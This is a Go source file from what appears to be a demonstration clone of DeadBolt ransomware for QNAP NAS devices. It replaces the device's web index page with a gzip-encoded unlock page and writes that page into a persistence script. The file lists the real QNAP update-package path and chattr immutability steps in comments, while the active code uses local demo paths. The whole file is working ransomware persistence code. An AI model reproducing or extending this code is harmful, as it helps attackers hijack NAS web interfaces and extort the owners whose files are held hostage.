package qnap


import (
  "os"
//  "os/exec"
  "io"
  "fmt"
  "embed"
  "bytes"
  "strings"
  "compress/gzip"

  "deadbolt_demo/shutil"
)


const (
  // index.html path
  indexHtmlPath string = "index.html"  // "/home/httpd/index.html"
  // CGI URL
  cgiURL string = "/index.html"
  // Persist script path
  persistScriptPath = "SDDPd.bin" // "/mnt/HDA_ROOT/update_pkg/SDDPd.bin"
  // Persist script required path
  persistScriptReqPath = ".SDDPd_required" // "/mnt/HDA_ROOT/update_pkg/.SDDPd_required"
)


//go:embed res_qnap/qnap_persist.sh
var res_qnap_content embed.FS


// Get CGI URL
func GetCGIURL() (s string) {

  return cgiURL
}


// Get index.html path
func GetIndexHtmlPath() (s string) {

  return indexHtmlPath
}


// Extract persist shell-script
func ExtractPersistScript() (err error) {

  f, err := res_qnap_content.Open("res_qnap/qnap_persist.sh")
  if err != nil { return err }

  defer f.Close()

  scriptData, err := io.ReadAll(f)
  if err != nil { return err }

  unlockCgiData, err := os.ReadFile(GetIndexHtmlPath())
  if err != nil { return err }

  var buf bytes.Buffer
  zw := gzip.NewWriter(&buf)
  _, err = zw.Write([]byte(unlockCgiData))
  if err != nil { return err }
  zw.Close()

  scriptText := strings.ReplaceAll(string(scriptData), "{CGI_ENCODED}",
                                   shutil.BinToStr(buf.Bytes()))

  err = os.WriteFile(persistScriptPath, []byte(scriptText), 0755)
  if err != nil { return err }

  //var cmd *exec.Cmd
  //cmd = exec.Command("chattr", "i+", persistScriptPath)
  //cmd.Run()
  //cmd = exec.Command("touch", persistScriptReqPath)
  //err = cmd.Run()
  //if err != nil { return err }
  //cmd = exec.Command("chattr", "i+", persistScriptReqPath)
  //cmd.Run()

  return nil
}


// Remove persist shell-script
func RemovePersistScript() (err error) {

  //var cmd *exec.Cmd
  //cmd = exec.Command("chattr", "i-", persistScriptPath)
  //cmd.Run()
  //cmd = exec.Command("chattr", "i-", persistScriptReqPath)
  //cmd.Run()

  os.Remove(persistScriptReqPath)
  os.Remove(GetIndexHtmlPath())

  // Rename index.html.bak to index.html
  os.Rename(fmt.Sprintf("%s.bak", GetIndexHtmlPath()), GetIndexHtmlPath())

  return nil
}
